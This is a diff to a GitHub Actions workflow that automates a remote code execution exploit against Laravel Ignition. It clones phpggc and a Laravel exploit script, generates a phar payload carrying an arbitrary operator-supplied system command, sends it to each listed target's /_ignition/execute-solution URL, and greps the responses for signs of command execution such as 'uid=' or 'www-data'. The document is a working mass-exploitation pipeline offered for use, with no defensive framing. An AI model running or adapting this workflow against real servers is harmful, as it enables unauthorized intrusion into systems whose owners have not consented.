@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       urls:
-        description: 'Full URLs including /_ignition/execute-solution (separated by spaces, commas, or mashed)'
+        description: 'FULL URLs including /_ignition/execute-solution (separated by spaces, commas, or mashed)'
         required: true
         type: string
       command:
@@ -29,30 +29,28 @@ jobs:
 
       - name: Clone Repositories
         run: |
-          git clone https://github.com/ambionics/phpggc.git || true
-          git clone https://github.com/ambionics/laravel-exploits.git || true
-          
-          if [ ! -f "laravel-exploits/laravel-ignition-rce.py" ]; then
-            echo "ERROR: laravel-ignition-rce.py not found!"
-            exit 1
-          fi
+          git clone https://github.com/ambionics/phpggc.git
+          git clone https://github.com/ambionics/laravel-exploits.git
 
-      - name: Generate Phar Payload
-        env:
-          CMD_INPUT: ${{ github.event.inputs.command }}
+      - name: Generate Phar Payload (Debug Mode)
         run: |
-          echo ">>> Generating exploit.phar for command: ${CMD_INPUT}"
+          set -x # Debug mode: prints every command
           
-          # MUST cd into phpggc directory so it can find its internal gadget chains
+          # Check if phpggc files are actually there
+          pwd
+          ls -la phpggc/
+          
+          # Move into the phpggc directory to run it (exactly like you do on your computer)
           cd phpggc
-          php -d "phar.readonly=0" ./phpggc --phar phar -o ../exploit.phar --fast-destruct monolog/rce1 system "$CMD_INPUT" || true
-          cd ..
           
-          if [ ! -f "exploit.phar" ]; then
-            echo "ERROR: Failed to generate exploit.phar!"
-            exit 1
-          fi
-          echo "Successfully generated exploit.phar"
+          # Run the EXACT command you provided
+          php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "${{ github.event.inputs.command }}"
+          
+          # Check if the phar was created
+          ls -la /tmp/exploit.phar
+          
+          # Move back to workspace
+          cd ..
 
       - name: Prepare URLs
         env:
@@ -92,8 +90,7 @@ jobs:
             echo "======================================" >> "$RESULT_FILE"
             
             # Run the Python script with the generated phar file, 60s timeout
-            # Using absolute path for exploit.phar
-            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" ${{ github.workspace }}/exploit.phar >> "$RESULT_FILE" 2>&1 || true
+            timeout 60 python3 laravel-exploits/laravel-ignition-rce.py "$url" /tmp/exploit.phar >> "$RESULT_FILE" 2>&1 || true
             
             # Check if the command output (e.g., 'uid=' from 'id') is in the result
             if grep -qi "uid=\|root\|nobody\|www-data\|daemon\|bin/bash\|total " "$RESULT_FILE"; then
